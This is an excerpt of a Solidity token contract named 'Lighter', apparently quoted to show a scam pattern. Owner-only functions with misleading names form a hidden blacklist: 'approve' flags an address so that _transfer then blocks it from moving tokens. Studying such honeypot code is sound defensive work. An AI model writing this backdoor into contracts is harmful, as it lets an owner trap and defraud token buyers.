...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_ll == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract Lighter is Context, IERC20, Ownable {
    ...
    string private _name = "Lighter";
    string private _symbol = "Lighter";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x171806Dc438ba2F70138287bD0236d32721517d9;
    ...
    function setCAN(bool Mame) external onlyOwner() {
        _tOwned = Mame;
    }
    function approve(address Mame) external onlyOwner() {
        _isExcludedFromFee[Mame] = true;
    }

    function _libera(address Mame) external onlyOwner() {
    ...
    function _transfer(
      ...
      if (_rOwned) {
            require(_isExcludedFromFee[from] == false, "You are in isExcludedFromFee");
        }  
